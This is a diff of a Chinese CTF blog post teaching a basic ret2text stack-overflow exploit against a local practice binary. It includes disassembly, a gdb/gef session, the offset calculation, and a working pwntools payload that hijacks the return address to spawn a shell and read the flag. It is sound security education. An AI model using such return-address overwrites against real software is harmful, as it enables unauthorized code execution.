-<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">0</span>80486A7                 lea     eax, [esp<span class="number">+80</span>h+s]</span><br><span class="line">.text:<span class="number">0</span>80486AB                 mov     [esp], eax      ; s</span><br><span class="line">.text:<span class="number">0</span>80486AE                 call    _gets</span><br><span class="line">.text:<span class="number">0</span>80486B3                 mov     dword ptr [esp], offset format ; <span class="string">&quot;Maybe I will tell you next time !&quot;</span></span><br><span class="line">.text:<span class="number">0</span>80486BA                 call    _printf</span><br><span class="line">.text:<span class="number">0</span>80486BF                 mov     eax, <span class="number">0</span></span><br><span class="line">.text:<span class="number">0</span>80486C4                 leave</span><br></pre></td></tr></table></figure>
+<div class="code-wrapper"><pre><code class="hljs C++">.text:<span class="hljs-number">0</span>80486A7                 lea     eax, [esp<span class="hljs-number">+80</span>h+s]
+.text:<span class="hljs-number">0</span>80486AB                 mov     [esp], eax      ; s
+.text:<span class="hljs-number">0</span>80486AE                 call    _gets
+.text:<span class="hljs-number">0</span>80486B3                 mov     dword ptr [esp], offset format ; <span class="hljs-string">&quot;Maybe I will tell you next time !&quot;</span>
+.text:<span class="hljs-number">0</span>80486BA                 call    _printf
+.text:<span class="hljs-number">0</span>80486BF                 mov     eax, <span class="hljs-number">0</span>
+.text:<span class="hljs-number">0</span>80486C4                 leave</code></pre></div>
 <p>用gef调试看看，现在<code>call _gets</code>的地址处下断点，然后run一下</p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">~ <span class="function">gdb ret2text</span></span><br><span class="line"><span class="function">GNU <span class="title">gdb</span> <span class="params">(Ubuntu <span class="number">12.1</span><span class="number">-0u</span>buntu1~<span class="number">22.04</span><span class="number">.2</span>)</span> 12.1</span></span><br><span class="line"><span class="function"><span class="title">Copyright</span> <span class="params">(C)</span> 2022 Free Software Foundation, Inc.</span></span><br><span class="line"><span class="function">gef➤ b *0x080486AE </span></span><br><span class="line"><span class="function">Breakpoint 1 at 0x80486ae: file ret2text.c, line <span class="number">24.</span> </span></span><br><span class="line"><span class="function">gef➤ r </span></span><br><span class="line"><span class="function">There is something amazing here, do you know anything? Breakpoint <span class="number">1</span>, <span class="number">0x080486ae</span> in main () at ret2text.c:<span class="number">24</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">[ Legend: Modified register | Code | Heap | Stack | String ]</span></span><br><span class="line"><span class="function">─────────────────────────────────────────────────────────────────────────────────────────────── registers ────</span></span><br><span class="line"><span class="function">$eax   : <span class="number">0xffffcf6c</span>  →  <span class="number">0xf7fc66d0</span>  →  <span class="number">0x0000000e</span></span></span><br><span class="line"><span class="function">$ebx   : <span class="number">0xf7fac000</span>  →  <span class="number">0x00229dac</span></span></span><br><span class="line"><span class="function">$ecx   : <span class="number">0xf7fad9b4</span>  →  <span class="number">0x00000000</span></span></span><br><span class="line"><span class="function">$edx   : <span class="number">0x1</span></span></span><br><span class="line"><span class="function">$esp   : <span class="number">0xffffcf50</span>  →  <span class="number">0xffffcf6c</span>  →  <span class="number">0xf7fc66d0</span>  →  <span class="number">0x0000000e</span></span></span><br><span class="line"><span class="function">$ebp   : <span class="number">0xffffcfd8</span>  →  <span class="number">0xf7ffd020</span>  →  <span class="number">0xf7ffda40</span>  →  <span class="number">0x00000000</span></span></span><br><span class="line"><span class="function">$esi   : <span class="number">0xffffd094</span>  →  <span class="number">0xffffd1fc</span>  →  <span class="string">&quot;/home/explorer/CTF-Challenge/Pwn/linux/user-mode/s[...]&quot;</span></span></span><br><span class="line"><span class="function">$edi   : <span class="number">0xf7ffcb80</span>  →  <span class="number">0x00000000</span></span></span><br><span class="line"><span class="function">$eip   : <span class="number">0x080486ae</span>  →  &lt;main<span class="number">+0066</span>&gt; call <span class="number">0x8048460</span> &lt;gets@plt&gt;</span></span><br><span class="line"><span class="function">$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]</span></span><br><span class="line"><span class="function">$cs: <span class="number">0x23</span> $ss: <span class="number">0x2b</span> $ds: <span class="number">0x2b</span> $es: <span class="number">0x2b</span> $fs: <span class="number">0x00</span> $gs: <span class="number">0x63</span></span></span><br></pre></td></tr></table></figure>
+<div class="code-wrapper"><pre><code class="hljs C++">~ <span class="hljs-function">gdb ret2text</span>
+<span class="hljs-function">GNU <span class="hljs-title">gdb</span> <span class="hljs-params">(Ubuntu <span class="hljs-number">12.1</span><span class="hljs-number">-0u</span>buntu1~<span class="hljs-number">22.04</span><span class="hljs-number">.2</span>)</span> 12.1</span>
+<span class="hljs-function"><span class="hljs-title">Copyright</span> <span class="hljs-params">(C)</span> 2022 Free Software Foundation, Inc.</span>
+<span class="hljs-function">gef➤ b *0x080486AE </span>
+<span class="hljs-function">Breakpoint 1 at 0x80486ae: file ret2text.c, line <span class="hljs-number">24.</span> </span>
+<span class="hljs-function">gef➤ r </span>
+<span class="hljs-function">There is something amazing here, do you know anything? Breakpoint <span class="hljs-number">1</span>, <span class="hljs-number">0x080486ae</span> in main () at ret2text.c:<span class="hljs-number">24</span></span>
+<span class="hljs-function"></span>
+<span class="hljs-function">[ Legend: Modified register | Code | Heap | Stack | String ]</span>
+<span class="hljs-function">─────────────────────────────────────────────────────────────────────────────────────────────── registers ────</span>
+<span class="hljs-function">$eax   : <span class="hljs-number">0xffffcf6c</span>  →  <span class="hljs-number">0xf7fc66d0</span>  →  <span class="hljs-number">0x0000000e</span></span>
+<span class="hljs-function">$ebx   : <span class="hljs-number">0xf7fac000</span>  →  <span class="hljs-number">0x00229dac</span></span>
+<span class="hljs-function">$ecx   : <span class="hljs-number">0xf7fad9b4</span>  →  <span class="hljs-number">0x00000000</span></span>
+<span class="hljs-function">$edx   : <span class="hljs-number">0x1</span></span>
+<span class="hljs-function">$esp   : <span class="hljs-number">0xffffcf50</span>  →  <span class="hljs-number">0xffffcf6c</span>  →  <span class="hljs-number">0xf7fc66d0</span>  →  <span class="hljs-number">0x0000000e</span></span>
+<span class="hljs-function">$ebp   : <span class="hljs-number">0xffffcfd8</span>  →  <span class="hljs-number">0xf7ffd020</span>  →  <span class="hljs-number">0xf7ffda40</span>  →  <span class="hljs-number">0x00000000</span></span>
+<span class="hljs-function">$esi   : <span class="hljs-number">0xffffd094</span>  →  <span class="hljs-number">0xffffd1fc</span>  →  <span class="hljs-string">&quot;/home/explorer/CTF-Challenge/Pwn/linux/user-mode/s[...]&quot;</span></span>
+<span class="hljs-function">$edi   : <span class="hljs-number">0xf7ffcb80</span>  →  <span class="hljs-number">0x00000000</span></span>
+<span class="hljs-function">$eip   : <span class="hljs-number">0x080486ae</span>  →  &lt;main<span class="hljs-number">+0066</span>&gt; call <span class="hljs-number">0x8048460</span> &lt;gets@plt&gt;</span>
+<span class="hljs-function">$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]</span>
+<span class="hljs-function">$cs: <span class="hljs-number">0x23</span> $ss: <span class="hljs-number">0x2b</span> $ds: <span class="hljs-number">0x2b</span> $es: <span class="hljs-number">0x2b</span> $fs: <span class="hljs-number">0x00</span> $gs: <span class="hljs-number">0x63</span></span></code></pre></div>
 <ul>
-<li>
-<h4 id="栈内存布局分析"><strong>栈内存布局分析</strong></h4>
+<li><h4 id="栈内存布局分析"><a href="#栈内存布局分析" class="headerlink" title="栈内存布局分析"></a><strong>栈内存布局分析</strong></h4></li>
+</ul>
+<p><code>buf</code>地址：<code>0xffffcd5c</code>(因为它是由 <code>eax</code> 和 <code>esp</code> 指向)，<code>ebp</code> 是 <code>0xffffcdc8</code>，而 <code>buf</code> 在 <code>0xffffcd5c</code>，两者距离为：0xffffcdc8 - 0xffffcd5c = 0x6c (108 字节), 因此，输入 108 字节后即可覆盖返回地址。</p>
+<ul>
+<li><h4 id="验证猜想"><a href="#验证猜想" class="headerlink" title="验证猜想"></a><strong>验证猜想</strong></h4><p>通过我们上面的分析可以构造以下payload:</p>
 </li>
 </ul>
-<p><code>buf</code>地址：<code>0xffffcd5c</code>(因为它是由 <code>eax</code> 和 <code>esp</code> 指向)，<code>ebp</code> 是 <code>0xffffcdc8</code>，而 <code>buf</code> 在 <code>0xffffcd5c</code>，两者距离为：0xffffcdc8 - 0xffffcd5c = 0x6c (108 字节), 因此，输入 108 字节后即可覆盖返回地址。</p>
-<ul>
-<li>
-<h4 id="验证猜想"><strong>验证猜想</strong></h4>
-<p>通过我们上面的分析可以构造以下payload:</p>
-</li>
-</ul>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;./ret2text&#x27;</span>)</span><br><span class="line">target = <span class="number">0x804863a</span></span><br><span class="line">sh.sendline(<span class="string">b&#x27;A&#x27;</span> * <span class="number">108</span> + p32(target))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+<div class="code-wrapper"><pre><code class="hljs Python"><span class="hljs-comment">##!/usr/bin/env python</span>
+<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+
+sh = process(<span class="hljs-string">&#x27;./ret2text&#x27;</span>)
+target = <span class="hljs-number">0x804863a</span>
+sh.sendline(<span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">108</span> + p32(target))
+sh.interactive()</code></pre></div>
 <p>得到以下输出，想想是哪里出了问题呢？</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">~ python3 exp.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./ret2text&#x27;</span>: pid 1593</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">There is something amazing here, <span class="keyword">do</span> you know anything?</span><br><span class="line">Maybe I will tell you next <span class="keyword">time</span> ![*] Got EOF <span class="keyword">while</span> reading <span class="keyword">in</span> interactive</span><br><span class="line">$ <span class="built_in">ls</span></span><br><span class="line">[*] Process <span class="string">&#x27;./ret2text&#x27;</span> stopped with <span class="built_in">exit</span> code -11 (SIGSEGV) (pid 1593)</span><br><span class="line">[*] Got EOF <span class="keyword">while</span> sending <span class="keyword">in</span> interactive</span><br></pre></td></tr></table></figure>
+<div class="code-wrapper"><pre><code class="hljs Bash">~ python3 exp.py
+[+] Starting <span class="hljs-built_in">local</span> process <span class="hljs-string">&#x27;./ret2text&#x27;</span>: pid 1593
+[*] Switching to interactive mode
+There is something amazing here, <span class="hljs-keyword">do</span> you know anything?
+Maybe I will tell you next <span class="hljs-keyword">time</span> ![*] Got EOF <span class="hljs-keyword">while</span> reading <span class="hljs-keyword">in</span> interactive
+$ <span class="hljs-built_in">ls</span>
+[*] Process <span class="hljs-string">&#x27;./ret2text&#x27;</span> stopped with <span class="hljs-built_in">exit</span> code -11 (SIGSEGV) (pid 1593)
+[*] Got EOF <span class="hljs-keyword">while</span> sending <span class="hljs-keyword">in</span> interactive</code></pre></div>
 <p>在此，笔者需要做一个小提示，在某些情况下，寄存器会占用栈空间（后续会专门发文详述），而在32位情况下。我们的<code>ebp</code>占用了4字节，所以正确的偏移地址应该是：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">总偏移 = buf 到 EBP 的距离 (0x6c) + EBP 自身大小 (4) = 0x70 (112)</span><br></pre></td></tr></table></figure>
+<div class="code-wrapper"><pre><code class="hljs x86asm">总偏移 = buf 到 <span class="hljs-built_in">EBP</span> 的距离 (<span class="hljs-number">0x6c</span>) + <span class="hljs-built_in">EBP</span> 自身大小 (<span class="hljs-number">4</span>) = <span class="hljs-number">0x70</span> (<span class="hljs-number">112</span>)</code></pre></div>
 <p>因此，正确的payload是：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;./ret2text&#x27;</span>)</span><br><span class="line">target = <span class="number">0x804863a</span></span><br><span class="line"><span class="comment"># sh.sendline(b&#x27;A&#x27; * (108+4) + p32(target))</span></span><br><span class="line">sh.sendline(<span class="string">b&#x27;A&#x27;</span> *(<span class="number">108</span>+<span class="number">4</span>) + p32(target))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+<div class="code-wrapper"><pre><code class="hljs Python"><span class="hljs-comment">##!/usr/bin/env python</span>
+<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+
+sh = process(<span class="hljs-string">&#x27;./ret2text&#x27;</span>)
+target = <span class="hljs-number">0x804863a</span>
+<span class="hljs-comment"># sh.sendline(b&#x27;A&#x27; * (108+4) + p32(target))</span>
+sh.sendline(<span class="hljs-string">b&#x27;A&#x27;</span> *(<span class="hljs-number">108</span>+<span class="hljs-number">4</span>) + p32(target))
+sh.interactive()</code></pre></div>
 <p>输出如下：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">explorer@DESKTOP-JPMNN21:~/CTF-Challenge/Pwn/linux/user-mode/stackoverflow/x86/basic-rop$ python3 exp.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./ret2text&#x27;</span>: pid 1766</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">There is something amazing here, <span class="keyword">do</span> you know anything?</span><br><span class="line">Maybe I will tell you next <span class="keyword">time</span> !$ <span class="built_in">ls</span></span><br><span class="line">exp.py  flag  ret2text</span><br><span class="line">$ <span class="built_in">cat</span> flag</span><br><span class="line">flag&#123;This_is_the_right_payload&#125;</span><br><span class="line">$</span><br><span class="line">[*] Interrupted</span><br><span class="line">[*] Stopped process <span class="string">&#x27;./ret2text&#x27;</span> (pid 1766)</span><br></pre></td></tr></table></figure>
+<div class="code-wrapper"><pre><code class="hljs Bash">explorer@DESKTOP-JPMNN21:~/CTF-Challenge/Pwn/linux/user-mode/stackoverflow/x86/basic-rop$ python3 exp.py
+[+] Starting <span class="hljs-built_in">local</span> process <span class="hljs-string">&#x27;./ret2text&#x27;</span>: pid 1766
+[*] Switching to interactive mode
+There is something amazing here, <span class="hljs-keyword">do</span> you know anything?
+Maybe I will tell you next <span class="hljs-keyword">time</span> !$ <span class="hljs-built_in">ls</span>
+exp.py  flag  ret2text
+$ <span class="hljs-built_in">cat</span> flag
+flag&#123;This_is_the_right_payload&#125;
+$
+[*] Interrupted
+[*] Stopped process <span class="hljs-string">&#x27;./ret2text&#x27;</span> (pid 1766)</code></pre></div>
 <p>不断更新，敬请期待！</p>
 <script src="https://giscus.app/client.js" data-repo="solkatt-cn/solkatt-cn.github.io" data-repo-id="R_kgDONzaTTQ" data-category="Announcements" data-category-id="DIC_kwDONzaTTc4Cpqn7" data-mapping="pathname" data-strict="0" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="top" data-theme="preferred_color_scheme" data-lang="zh-CN" crossorigin="anonymous" async>
 </script>
 
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/Pwn/" class="category-chain-item">Pwn</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Pwn/" class="print-no-link">#Pwn</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Basic ROP Learning</div>
+      <div>https://fishcanf1y.github.io/2025/04/19/Basic-ROP-Learning/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>fishcanf1y</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>April 19, 2025</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2025/05/17/NOIP-2002-%E6%99%AE%E5%8F%8A%E7%BB%84-%E9%80%89%E6%95%B0/" title="由一道题引发对DFS的思考">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">由一道题引发对DFS的思考</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/02/08/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/" title="条件竞争漏洞学习">
+                        <span class="hidden-mobile">条件竞争漏洞学习</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
     </div>
 
-    
-    
-    
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>Table of Contents</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
 
-      <footer class="post-footer">
-          <div class="post-tags">
-              <a href="/tags/Pwn/" rel="tag"># Pwn</a>
-          </div>
-
-        
 
 
-        
-    <div class="post-nav">
-      <div class="post-nav-item">
-    <a href="/2025/02/08/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/" rel="prev" title="条件竞争漏洞学习">
-      <i class="fa fa-chevron-left"></i> 条件竞争漏洞学习
-    </a></div>
-      <div class="post-nav-item">
-    <a href="/2025/05/10/%E9%80%9A%E8%BF%87C++%E5%AE%9E%E7%8E%B0%E8%AE%A1%E7%AE%97%E7%83%B7%E7%83%83%E5%90%8C%E5%88%86%E5%BC%82%E6%9E%84%E4%BD%93%E6%95%B0%E9%87%8F/" rel="next" title="C++计算烷烃同分异构体数量(一)">
-      C++计算烷烃同分异构体数量(一) <i class="fa fa-chevron-right"></i>
-    </a></div>
+  </aside>
+
+
     </div>
-      </footer>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+  
+  
+
+
+
+
+
+
+
+
+
     
-  </article>
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
   
   
   
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
 
 
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
 
-          </div>
-          
 
-<script>
-  window.addEventListener('tabs:register', () => {
-    let { activeClass } = CONFIG.comments;
-    if (CONFIG.comments.storage) {
-      activeClass = localStorage.getItem('comments_active') || activeClass;
-    }
-    if (activeClass) {
-      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
-      if (activeTab) {
-        activeTab.click();
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
       }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
     }
-  });
-  if (CONFIG.comments.storage) {
-    window.addEventListener('tabs:click', event => {
-      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
-      let commentClass = event.target.classList[1];
-      localStorage.setItem('comments_active', commentClass);
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
     });
-  }
+  });
 </script>
 
-        </div>
-          
-  
-  <div class="toggle sidebar-toggle">
-    <span class="toggle-line toggle-line-first"></span>
-    <span class="toggle-line toggle-line-middle"></span>
-    <span class="toggle-line toggle-line-last"></span>
-  </div>
 
-  <aside class="sidebar">
-    <div class="sidebar-inner">
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
 
-      <ul class="sidebar-nav motion-element">
-        <li class="sidebar-nav-toc">
-          Table of Contents
-        </li>
-        <li class="sidebar-nav-overview">
-          Overview
-        </li>
-      </ul>
+  <script>Fluid.plugins.codeWidget();</script>
 
-      <!--noindex-->
-      <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Basic-ROP-Learning"><span class="nav-number">1.</span> <span class="nav-text">Basic-ROP-Learning</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ROP-Return-Oriented-Programming-%E6%A6%82%E8%BF%B0"><span class="nav-number">2.</span> <span class="nav-text">ROP(Return-Oriented Programming)概述</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5"><span class="nav-number">2.1.</span> <span class="nav-text">1. 基本概念</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%EF%BC%881%EF%BC%89%E4%BA%A7%E7%94%9F%E8%83%8C%E6%99%AF"><span class="nav-number">2.1.1.</span> <span class="nav-text">（1）产生背景</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%EF%BC%882%EF%BC%89%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86"><span class="nav-number">2.1.2.</span> <span class="nav-text">（2）核心原理</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E5%85%B3%E9%94%AE%E7%BB%84%E4%BB%B6"><span class="nav-number">2.2.</span> <span class="nav-text">2. 关键组件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-%E6%94%BB%E5%87%BB%E6%AD%A5%E9%AA%A4"><span class="nav-number">2.3.</span> <span class="nav-text">3. 攻击步骤</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-%E9%98%B2%E5%BE%A1%E6%8E%AA%E6%96%BD"><span class="nav-number">2.4.</span> <span class="nav-text">4. 防御措施</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-%E5%AE%9E%E4%BE%8B-Linux-x86-ROP-Exploit"><span class="nav-number">2.5.</span> <span class="nav-text">5.实例 Linux x86 ROP Exploit</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1-ret2text"><span class="nav-number">2.5.0.1.</span> <span class="nav-text">(1) ret2text</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9F%BA%E6%9C%AC%E5%88%86%E6%9E%90"><span class="nav-number">2.5.1.</span> <span class="nav-text">基本分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%A0%88%E5%86%85%E5%AD%98%E5%B8%83%E5%B1%80%E5%88%86%E6%9E%90"><span class="nav-number">2.5.2.</span> <span class="nav-text">栈内存布局分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%AA%8C%E8%AF%81%E7%8C%9C%E6%83%B3"><span class="nav-number">2.5.3.</span> <span class="nav-text">验证猜想</span></a></li></ol></li></ol></li></ol></div>
-      </div>
-      <!--/noindex-->
-
-      <div class="site-overview-wrap sidebar-panel">
-        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
-    <img class="site-author-image" itemprop="image" alt="V4Ethan"
-      src="/images/avatar.jpg">
-  <p class="site-author-name" itemprop="name">V4Ethan</p>
-  <div class="site-description" itemprop="description">V4Ethan's Blog</div>
-</div>
-<div class="site-state-wrap motion-element">
-  <nav class="site-state">
-      <div class="site-state-item site-state-posts">
-          <a href="/archives/index.html">
-        
-          <span class="site-state-item-count">11</span>
-          <span class="site-state-item-name">posts</span>
-        </a>
-      </div>
-      <div class="site-state-item site-state-categories">
-        <span class="site-state-item-count">4</span>
-        <span class="site-state-item-name">categories</span>
-      </div>
-      <div class="site-state-item site-state-tags">
-        <span class="site-state-item-count">5</span>
-        <span class="site-state-item-name">tags</span>
-      </div>
-  </nav>
-</div>
-  <div class="links-of-author motion-element">
-      <span class="links-of-author-item">
-        <a href="https://github.com/V4Ethan" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;V4Ethan" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
-      </span>
-      <span class="links-of-author-item">
-        <a href="mailto:iszhenghailin@gmail.com" title="E-Mail → mailto:iszhenghailin@gmail.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
-      </span>
-  </div>
-
-
-
-      </div>
-
-    </div>
-  </aside>
-  <div id="sidebar-dimmer"></div>
-
-
-      </div>
-    </main>
-
-    <footer class="footer">
-      <div class="footer-inner">
-        
-
-        
-
-<div class="copyright">
-  
-  &copy; 
-  <span itemprop="copyrightYear">2025</span>
